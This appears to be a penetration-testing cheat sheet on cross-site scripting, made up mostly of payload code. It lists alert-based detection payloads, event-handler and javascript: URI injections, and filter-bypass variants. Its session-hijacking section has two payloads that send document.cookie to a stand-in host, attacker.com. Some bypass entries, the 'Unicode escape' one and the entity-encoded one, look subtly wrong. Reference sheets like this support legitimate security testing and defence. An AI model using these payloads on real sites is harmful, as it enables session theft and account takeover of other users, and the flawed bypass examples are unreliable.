# Cross-Site Scripting (XSS)

XSS allows injection of malicious scripts into pages viewed by other users. Impacts range from session theft to full account takeover.

## Types

| Type | Persistence | Execution |
|------|-------------|-----------|
| Reflected | None | URL parameter reflected in response |
| Stored | Database | Saved and served to all users |
| DOM-Based | None | Manipulates client-side DOM via JS |

## Detection Payloads

```javascript
// Basic alert test
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>

// Event handler injection
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

// Without parentheses (filter bypass)
<script>alert`1`</script>

// javascript: URI
<a href="javascript:alert(1)">click</a>
```

## Session Hijacking

```javascript
// Steal cookie and send to attacker
<script>
fetch('https://attacker.com/?c='+document.cookie)
</script>

// Or with Image
<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
```

## DOM XSS Sources & Sinks

```javascript
// Dangerous sources (user-controlled input)
document.URL
document.location
window.location.href
document.referrer

// Dangerous sinks (write to page)
innerHTML
document.write()
eval()
setTimeout()
location.href = input
```

## Filter Bypass

```javascript
// Case variation
<ScRiPt>alert(1)</sCrIpT>

// HTML entities
&lt;script&gt;alert(1)&lt;/script&gt;

// Unicode escape
<script>alert(1)</script>

// Double encoding
%253Cscript%253Ealert(1)%253C/script%253E
```
